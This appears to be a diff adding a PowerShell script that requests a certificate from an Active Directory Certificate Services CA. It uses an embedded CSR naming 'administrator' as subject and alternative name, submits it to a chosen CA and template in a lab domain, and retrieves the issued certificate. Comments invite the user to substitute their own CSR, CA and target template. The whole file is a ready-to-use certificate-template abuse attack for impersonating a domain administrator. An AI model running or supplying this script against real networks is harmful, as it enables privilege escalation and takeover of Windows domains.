@@ -1,0 +1,40 @@
+# replace CSR content
+$CSR = @"
+-----BEGIN CERTIFICATE-----
+MIIELTCCAxUCAQAwWDETMBEGCgmSJomT8ixkARkWA2xhYjEZMBcGCgmSJomT8ixk
+ARkWCWluZGlzaGVsbDEOMAwGA1UEAwwFVXNlcnMxFjAUBgNVBAMMDWFkbWluaXN0
+cmF0b3IwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDlLr+cCgAkDb4Z
+teRM5fqetZ7ufpsDJCla84TTfpbW/oIpYVtuW0NXx0ltUQuEgYzDMtWvuUtWntDU
+Kmy/HDKU0WVpBPQH4ORgTgetOxu9a2UjH+9NMRGKoQyOg4B6yKe593yPWLJSwPAg
+PRWrU7ZPX0N/Q+aE0JJt5zgpMjDZdb2RU6zAxoHYFmyDBzE1ttNcYmBucBicBTRn
+QKedQwOWURR4nv1Dkz2VES1mlWsYqzbFC7D3cerrEW5EgOIyNc1P9UuF407CMtoP
+yZChJhWQCpPMTaC4/H8HHjVQbHlngx7Ljihm5sT6U7fNjgJVekUq+R4cAldL/mRD
+js/e10ODAgMBAAGgggGOMBwGCisGAQQBgjcNAgMxDhYMMTAuMC4xNDM5My4yME8G
+CSsGAQQBgjcVFDFCMEACAQUMG1dJTkJPWDEucXVlZW4uaW5kaXNoZWxsLmxhYgwK
+cXVlZW5cYjB4MQwSUG93ZXJTaGVsbF9JU0UuZXhlMHQGCisGAQQBgjcNAgIxZjBk
+AgEBHlwATQBpAGMAcgBvAHMAbwBmAHQAIABFAG4AaABhAG4AYwBlAGQAIABDAHIA
+eQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByACAAdgAxAC4A
+MAMBADCBpgYJKoZIhvcNAQkOMYGYMIGVMCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQC
+A6APDA1hZG1pbmlzdHJhdG9yMB0GA1UdJQQWMBQGCCsGAQUFBwMBBggrBgEFBQcD
+AjAbBgkrBgEEAYI3FQoEDjAMMAoGCCsGAQUFBwMCMB0GA1UdDgQWBBT5TLINiH4n
+uRKRlpPVDM5jZvaRDjAOBgNVHQ8BAf8EBAMCBSAwDQYJKoZIhvcNAQEFBQADggEB
+ALCsoKPLOvzDG6EKDNbX42l9aoe9gpMQghDezaOvGv3vwQM84q13CFUCl9pH1oG6
+B9SFEFyouBucCqmMdk40imfJGXmAOQOzuOZt5sd5uRFLm9vw/lxtfCuxzvTMAeTL
+uzwNxwHtevpx5PWHo7BfJ2VaKuLWkOIM0sLd/fUXKtAV5RPRnfqzOqd9DayzLcxr
+eFU4RtWGODj9HRvbkBcqAYfpl3ejQmguZG4MzHsld97QjPGK/6KOvw2S1zrkRWOo
+mkZAgBOUt1a+HyxeQMj7NPoHkTx4DW1E3hAgr7Jhk9RWo57+CmsFG0BoYvoLk7L8
+9CpEija6BgMKOMKt0qnRJqM=
+-----END CERTIFICATE-----
+"@
+
+$CAName = "DC01.queen.indishell.lab\queen-DC01-CA" # replace CA name
+$CertRequest = New-Object -ComObject CertificateAuthority.Request
+
+# replace template name (OneViewappliances) with target certificate template
+$Status = $CertRequest.Submit(0,$csr,"CertificateTemplate:OneViewappliances",$CAName)
+$RequestID = $CertRequest.GetRequestId()
+
+if ($Status -eq 3) { 
+    Write-Output " [+] Certificate submitted successfully! Request ID is $RequestID `n"
+    $CertRequest.GetCertificate(0)
+}
